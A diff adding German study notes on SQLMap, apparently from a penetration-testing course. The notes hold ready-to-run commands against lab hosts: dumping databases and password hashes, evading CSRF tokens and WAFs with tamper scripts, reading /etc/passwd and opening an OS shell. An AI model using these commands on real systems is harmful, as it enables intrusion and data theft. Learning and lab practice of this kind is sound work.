@@ -1,0 +1,283 @@
+SQLMap Essentials
+Getting Started:
+1. SQLMap Overview:
+- SQLMap ist ein open-Source TOol mit der wir SQL Injections automatisch erkennen koennen
+- python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
+
+- SQLMap Installation:
+	- sudo apt install sqlmap
+	- Manuell:
+		- git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+		- python sqlmap.py
+
+- Supported SQL Injection Types:
+	- In SQLMap gibt es mehrere SQL Injection Typen
+	- Diese koennen mit sqlmap --h ausgegeben werden
+
+2. Getting Started with SQLMap:
+- Mit -h wird eine grundlegende Hilfe ausgegeben
+- Mit -hh wird eine vollstaendige Hilfe ausgegeben
+- Die Option --batch ueberspringt den erforderlichen Userinput
+
+3. SQLMap Output Description:
+- Log Messages Description:
+	- URL content is stable:
+		- Anfragen unterscheiden sich nicht gross voneinander 
+	- Parameter appears to be dynamic:
+		- Eine Aenderung des Wertes hat einen Einfluss auf die Ausgabe
+	- Parameter might be injectable:
+		- Wenn ein SQL Fehler ausgegeben wird ist dies ein Anzeichen, dass der Parameter injizierbar ist
+	- Parameter might be vulnerable to XSS attacks:
+		- Deutet darauf hin, dass es eine XSS Schwachstelle gibt
+	- Back-ende DBMS is '...':
+		- Gibt das DBMS aus
+	- Level/risk values:
+		- Tests weren speziell fuer das DBMS angepasst
+	- Reflective values found:
+		- Teile der Payload wurden in der Ausgabe gefunden
+	- Parameter appears to be injectable:
+		- Parameter scheint injizierbar zu sein
+	- Time-based comparison statistical model:
+		- Erkennt ob eine Abfrage mehr Zeit benoetigt
+	- Extending UNION query injection technique tests:
+		- UNION Abfragen benoetigen mehr Zeit deswegen wird die Anzahl von Wiederholungen begrenzt
+	- Technique appears to be usable:
+		- Die Spaltenanzahl fuer Union wird mit ORDER BY bestimmt
+	- Parameter is vulnerable:
+		- Schwachstelle wurde in einem Parameter gefunden
+	- Sqlmap identified injection points:
+		- Eine Auflistung von Injektionspunkten mit Typ, Titel und Payload
+	- Data logged to text files:
+		- Gibt ein Verzeichnis fuer die Ausgabedaten an
+
+############################################################################################
+Building Attacks:
+1. Running SQLMap on an HTTP Request:
+- SQLMap kann fuer jede HTTP Anfrage angepasst werden
+- Wir koennen im Network Monitor im Browser die Anfrage mit Copy as cURL kopieren und dann der SQLMap uebergeben
+
+- GET/POST Request:
+	- GET Parameter werden durch die Option -u mitgegeben
+		- sqlmap -u 'http://inlanefreight.htb/page.php?id=5'
+	- POST Parameter werden durch die Option --data mitgegeben
+		- sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
+
+- Full HTTP Requests:
+	- Wenn es um eine komplexe Anfrage geht kann die HTTP Anfrage komplett in eine Datei geschrieben werden und mit der Option -r an SQLMap uebergeben werden
+	- sqlmap -r http_request.txt
+
+- Custom SQLMap Requests:
+	- Wir koenne ebfalls einen Cookie Werte und andere HTTP Headerdaten mitgegeben werden
+	- Mit --cookie kann ein Cookie mitgegeben werden mit -H koennen Headerdaten mitgegeben werden
+		- sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+		- sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+	- Mit --random-agent kann der User-Agent im HTTP Header gesetzt werden
+	- Mit --mobile kann die Smartphone Variante angefordert werden
+	- Die HTTP Methode kann mit --method gesetzt werden
+
+- Custom HTTP Requests:
+	- SQLMap unterstuetzt nicht nur POST Form-Daten sondern auch JSON und XML formatierte HTTP Anfragen
+	- Die komplex formatierten Daten koennen mit -r uebergeben koennen
+
+Question:
+	- 1. sqlmap 'http://138.68.170.86:30776/case2.php' --data 'id=1' --batch --dump
+	- 2. sqlmap 'http://138.68.170.86:30776/case3.php' --batch --dump --cookie="id=1*"
+	- 3. sqlmap 'http://138.68.170.86:30776/case4.php' --data '{"id":1}' --batch --dump
+
+2. Handling SQLMap Errors:
+- Manchmal kommt es bei der Ausfuehrung von SQLMap zu Fehlern
+
+- Display Errors:
+	- Mit der Option --parse-errors um die Fehler der DBMS auzugeben
+- Store the Traffic:
+	- Die Option -t speichert den Traffic in einer Datei
+- Verbose Output:
+	- Die Ausgabe von SQLMap ist ausfuehrlicher mit der Option -v [level 1 bis 10]
+- Using Proxy:
+	- Mit der Option --proxy koennen wir den Traffic durch einen Proxy weiterleiten
+
+3. Attack Tuning:
+- Wir koennen den SQLMap Befehl dem Ziel anpassen
+- Der Payload besteht aus zwei Dingen:
+	- vector: Beinhaltet den SQL Code der auf dem Ziel ausgefuehrt wird
+	- boundaries: Wird als Injection verwendet fuer das SQL Statement prefix und suffix
+
+- Prefix/Suffix:
+	- Ein Prefix kann mit --prefix und Suffix kan mit --suffix gegeben werden
+
+- Level/Risk:	
+	- --level(1,5) erweitert vectors und boundaries basierend auf der Wahrscheinlichkkeit des Erfolgs
+	- --risk(1,3) erweitert vectors basierend auf dem Risiko ein Problem zu verursachen
+
+- Advanced Tuning:
+	- Wir koennen den Befehl fuer die Erkennungsmechanismus optimieren
+	- Status Codes:
+		- Wir koennen bei dyamischen Kontent mit --code den HTTP Erfolgscode definieren mit --code
+	- Strings:
+		- Wir koennen nur nach einem Wert in Suchen mit --string="Begriff"
+	- Text-only:
+		- Mit --text-only koennen wir nur die sichtbaren Inhalte durchsuchen und die HTML Tags ausblenden
+	- Techniques:
+		- Mit --technique koennen wir den Injection Typ definieren
+
+- UNION SQLi Tuning:
+	- Mit einer UNION SQL Injection Payload koennen wir die Spaltenanahl mit --union-cols definieren
+	- Mit --union-from koennen wir die Tabelle fuer die Abfrage definieren
+
+Question:
+	- 1. sqlmap 'http://167.71.133.128:32593170.86:31352/case5.php?id=1' --batch --dump --level=5
+	- 2. sqlmap 'http://167.71.133.128:32593/case6.php?col=id' --dump --prefix='`)'
+	- 3. sqlmap 'http://167.71.133.128:32593/case7.php?id=1' --dump -union-cols=5 --union-char='a'
+
+############################################################################################
+Database Enumeration
+1. Database Enumeration:
+- Wir koennen die Datenbank enumerieren und dadurch wertvolle Infomationen sammeln
+
+- SQLMap Data Exfiltration:
+	- Fuer Enumerierungen gibt es fuer SQLMap spezielle Abfragen fuer verschiedene DBMS
+
+- Basic DB Data Enumeration:
+	- Wenn wir eine SQLi Schwachstelle haben koennen wir  
+	- Mit --hostname wird der Hostname ausgegeben
+	- Mit --current-user wird der aktueller Usernam ausgegeben
+	- Mit --current-db wird den Datenbanknamen ausgegeben
+	- Mit --passwords wird der Passwordhash ausgegeben
+	- Mit --banner wird die Version der Datenbank ausgegeben
+
+- Table Enumeration:
+	- Mit --dump wird eine Tabelle ausgegeben
+	- Mit --tables koennen wir die Tabellenamen ausgeben in einer Datenbank
+	- Mit -D geben wir den Datenbanknamen an
+	- Mit -T geben wir den Tabellennamen an
+
+- Table/Row Enumeration:
+	- Mit -C definieren wir die Spalten die ausgegeben werden sollen
+	- Mit --start geben wir an bei welcher Reihe wir anfangen koennen
+	- Mit --stop geben wir an bei welcher Reihe wir aufhoeren
+
+- Conditional Enumeration:
+	- Mit --where kann eine Where Bedingung in einem SELECT Statement ausgegeben werden
+
+- Full DB Enumeration:
+	- Wenn wir --dump-all geben wir alle Datenbaenke mit allen Tabellen aus
+	- Mit --exclude-sysdbs schliessen wir die Systemtabellen von der Ausgabe aus
+
+- Question:
+	- 1. sqlmap -u "http://167.71.133.128:32750/case1.php?id=1" --dump -T flag1 -D testdb
+
+
+2. Advanced Database Enumeration:
+- DB Schema Enumeration:
+	- Wenn wir die Struktur der Tabellen haben wollen koenenn wir die Option --schema verwenden
+
+- Searching for Data:
+	- Mit --search -T <Suchwort> koennen wir alle Tabellennamen nach diesem Suchwort filtern
+	- Mit --search -C <Suchwort> koennen wir alle Eintraege nach einem Wort zu suchen
+
+- DB Users Password Enumeration and Cracking:
+	- Mit --password koennen wir nach Credentials suchen
+
+- Question:
+	- 1. sqlmap -u "http://167.71.133.128:30253/case1.php?id=1" --search -C style
+	- 2. sqlmap -u "http://167.71.133.128:30253/case1.php?id=1" --dump -D testdb -T users --where="name LIKE 'Kimberly%'" 
+
+############################################################################################
+Advanced SQLMap Usage
+1. Bypassing Web Application Protections:
+- Es gibt Verteidigungstools die die Datenbank gegen Tools wie SQLMaps beschuetzten
+- SQLMap hat eingebaute Mechanismen um solche Verteidigungsmassnahmen zu umgehen
+
+- Anti-CSRF Token Bypass:
+	- Cross Site Request Forgery (CSRF) ist ein Verteidigungstool um vor Links zu schuetzen
+	- Mit --csrf-token kann dieses Tool umgangen werden
+
+- Unique Value Bypass:
+	- Manche Webanwendungen benoetigen eine einzigartigen Wert in einem Eingabefeld, dieser kann mit der Option --randomize festgelegt werden
+
+- Calculated Parameter Bypass:
+	- Manchmal muss der Parameter verarbeitet werden dies kann mit --eval geschehen
+
+- IP Address Concealing:
+	- Wenn wir unsere IP-Adresse verschleiern wollen koennen wir mit --proxy oder --proxy-file arbeiten
+
+- WAF Bypass:
+	- SQLMap sendet den Payload an einen nicht existierenden Parameter und teste ob eine Web Application Firewall(WAF) existiert
+	- Mit --skip-waf kann diese Firewall uebersprungen werden
+
+- User-agent Blacklisting Bypass:
+	- Manchmal wird der user-agnet von der Anwendung gesperrt diesen koennen wir mit --random-agent zufaellig auswaehlen
+
+- Tamper Scripts:
+	- Das Tamper Script aendert Logische Parameter in eine ausgeschrieben Gleichung 
+	- Es gibt eine liste an Tamper Scripten wie die logischen Parameter uebersetzt werden sollen
+	- Mit --tamper kann ein Tamper Script angegeben
+
+- Miscellaneous Bypasses:
+	- --chunked teil den Payload in mehrere POST Request Bodys ein und teilt die bei geblacklisteten SQL Keyworten
+	- --hpp setzt teilt das Payload in die URL auf mit unterschliedlichen Parameternamen
+
+Question:
+	- 1. sqlmap "http://157.245.41.35:30813/case8.php" --data="id=1&t0ken=tB7BuRFHl7yLrWqU9NKFbrO66OJ9Wn5aeXtBUzmL08" -csrf-token="t0ken" --dump
+	- 2. sqlmap -u "http://157.245.41.35:30813/case9.php?id=1&uid=2924002967" --randomize=uid --dump
+	- 3. sqlmap -u "http://157.245.41.35:30813/case10.php" --data="id=1" --dump --random-agent
+	- 4. sqlmap -u "http://157.245.41.35:30813/case11.php?id=1" --tamper=between --dump
+
+2. OS Exploitation:
+- SQLMap kann lokale Daten durch die DBMS schreiben und lesen
+
+- File Read/Write:
+	- Um Dateien lesen zu koennen benoetigen wir LOAD DATA und INSERT Rechte in MySQL DBMS
+	- Immer haeufiger benoetigen wir dafuer database administrator privleges(DBA) Rechte
+	- Ein Beispielbefehl waere LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
+
+- Checking for DBA Privileges:
+	- Um zu pruefen ob wir DBA Rechte haben koennen wir die Option --is-dba verwenden
+
+- Reading Local Files:
+	- Mit --file-read kann eine Datei auf dem lokalen System gespeichert werden
+
+- Writing Local Files:
+	- In SQL ist--secure-file-priv deaktiviert damit keine Dateien auf dem geschrieben werden koennen
+	- mit --file-write kann die Datei definiert werden mit --file-dest kann das Ziel dieser Datei definiert werden
+
+- OS Command Execution:
+	- Nachdem wir wissen, dass wir Dateien schreiben koennen, koennen wir eine OS Shell mit --os-shell bekommen
+	- --os-shell is zu vergleichen mit xp_cmdshell fuer MSSQL
+
+- Question:
+	- 1. sqlmap -u "http://159.65.54.124:32628/?id=1" --file-read "/var/www/html/flag.txt"
+	- 2. sqlmap -u "http://159.65.54.124:32628/?id=1" --os-shell --technique=E
+		- cat /flag.txt
+
+############################################################################################
+Skills Assessment
+1. Skills Assessment:
+- 1. What's the contents of table final_flag?:
+	- sqlmap -r req.txt --tamper=between --current-db
+	- sqlmap -r req.txt --tamper=between --tables -D production
+		- 	Database: production
+			[5 tables]
+			+-------------+
+			| brands      |
+			| categories  |
+			| final_flag  |
+			| order_items |
+			| products    |
+			+-------------+
+	- sqlmap -r req.txt --tamper=between -D production -T final_flag --dump
+
+req.txt:
+	POST /action.php HTTP/1.1
+	Host: 159.65.30.174:31324
+	Content-Length: 8
+	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+	Content-Type: application/json
+	Accept: */*
+	Origin: http://159.65.30.174:31324
+	Referer: http://159.65.30.174:31324/shop.html
+	Accept-Encoding: gzip, deflate
+	Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+	Connection: close
+
+	{"id":1}
